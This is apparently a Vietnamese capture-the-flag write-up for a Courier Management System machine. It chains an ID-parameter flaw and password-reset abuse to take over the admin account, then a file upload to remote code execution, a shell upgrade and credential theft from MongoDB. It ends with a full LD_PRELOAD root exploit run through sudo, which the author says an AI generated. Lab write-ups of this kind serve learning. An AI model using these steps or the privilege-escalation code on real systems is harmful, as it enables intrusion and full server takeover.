Web này đang dùng Courier Management System, ở đây có nói là lỗ hổng liên quan tới id, nghĩa là liên quan tới parameter. Nên mình sau khi đăng kí và đăng nhập tài khoản sẽ đi đến chỗ edit profile

<img width="1543" height="787" alt="image" src="https://github.com/user-attachments/assets/c39776a3-4bd4-4319-a0f5-dcdcfbce61aa" />

nhưng chỉ có admin mới có thể thay đổi tham số và hệ thống đã làm lộ mail của admin, ta có thể lợi dụng lỗ hổng đổi mật khẩu để lấy được account của admin.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/bae3d2e5-4eca-41ae-983a-7b1f560c6ebc" />
<img width="1596" height="898" alt="image" src="https://github.com/user-attachments/assets/d0124ea4-8526-48fb-950f-8882a41384f8" />

sau khi vào được tài khoản của admin thì có thể lợi dụng lỗ hổng file upload để rce lên server. Hãy nhớ đọc source code để tìm đường dẫn tới file đã upload lên để thực thi

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/7ad003b4-ac24-4805-92cc-69d8138fbf42" />

lên được server rồi có thể dùng lệnh này để nâng cấp shell `/usr/bin/script -qc /bin/bash /dev/null`

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/40755f83-44bc-40a6-b228-b68f4103cf81" />

tiếp theo sẽ đi lục các thư mục khác xem có gì trỏng không. Thay vì sql thì có được mongo của webdeveloper nên mình sẽ đi tìm mật khẩu của người dùng đó thông qua các databases

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/466669c8-bc07-4fea-bed0-85c5b5215b56" />

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/f0cba0e7-3351-4654-b160-4709e5318583" />

tới phần này thì có thể tìm cách leo root trên gtfobins hoặc là nhờ AI code cho lệnh

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/c75361cf-99e5-4598-914f-fd403dba2432" />

ở đây là mình chọn AI thì nó có giải thích là:

<img width="1047" height="382" alt="image" src="https://github.com/user-attachments/assets/2395f982-3a51-47f6-a22f-1aaabe27fdea" />

có thể dùng script này của AI
```
# tạo file c
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
# biên dịch file thành thư viện động
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
# thực thi 
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```
vậy là ta đã lên được root và tìm flag thành công
<img width="2502" height="216" alt="image" src="https://github.com/user-attachments/assets/eb2be341-2ff2-4e44-8e28-4ca0cd5a5523" />









